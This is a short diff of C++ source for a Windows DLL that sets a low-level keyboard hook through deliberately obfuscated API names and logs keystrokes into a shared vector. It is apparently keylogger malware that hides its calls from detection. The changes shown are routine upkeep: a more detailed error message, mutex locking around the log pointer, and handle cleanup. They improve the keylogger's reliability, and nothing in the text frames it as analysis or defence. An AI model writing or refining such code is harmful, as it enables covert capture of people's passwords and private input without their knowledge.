@@ -52,7 +52,9 @@ void* FindExportAddress(HMODULE hModule, const char* funcName)
 
         }
     }
-    MessageBoxA(NULL, "Failed to find export address" , "Error", MB_OK);
+    std::string errorMsg = "Failed to find export address for function: ";
+    errorMsg += funcName;
+    MessageBoxA(NULL, errorMsg.c_str(), "Error", MB_OK);
     return nullptr;
 
 }
@@ -90,7 +92,11 @@ DLL_EXPORT void Initialize(std::vector<std::string>* logVector)
     SecureZeroMemory(obf_Get_Kbd_Stt, sizeof(obf_Get_Kbd_Stt));
     SecureZeroMemory(obf_To_Unicode, sizeof(obf_To_Unicode));
 
-    sharedLogVector = logVector;  
+    {
+        std::lock_guard<std::mutex> lock(logMutex);
+        sharedLogVector = logVector;
+    }
+
     k_Hook = My_Set_WinDows_Huk_ExA(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
 }
 
@@ -100,9 +106,12 @@ DLL_EXPORT void Cleanup()
     {
         My_Unhuk_WinDows_Huk_Ex(k_Hook);
         FreeLibrary(hUser32);
+        hUser32 = NULL;
         k_Hook = nullptr;
+        hUser32 = nullptr;
     }
 }
+
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
